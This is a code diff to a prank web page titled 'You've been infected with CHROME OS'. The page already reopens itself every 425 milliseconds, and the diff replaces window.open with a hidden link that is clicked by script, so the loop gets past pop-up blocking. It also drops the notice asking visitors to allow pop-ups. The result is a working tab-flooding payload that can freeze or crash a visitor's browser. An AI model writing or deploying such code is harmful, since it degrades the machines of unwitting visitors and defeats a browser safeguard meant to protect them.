@@ -14,9 +14,14 @@
         }
         return color;
       }
+      function newTab(){
+        var lin=document.getElementById("link");
+        lin.href=window.location;
+        lin.click();
+      }
       document.getElementById("body").style.backgroundColor=getRandomColor();
-      window.setInterval(function(){window.open(window.location);},425);
+      window.setInterval(function(){newTab();},425);
     </script>
-    Tabs <br>&copy; 2018-19 <a href="github.com/chexbox">chexbox</a><h1>You've been infected with CHROME OS</h1>Please Enable pop-ups
+    Tabs <br>&copy; 2018-19 <a href="github.com/chexbox">chexbox</a><h1>You've been infected with CHROME OS</h1><a id="link" target="_blank"></a>
   </body>
 </html>
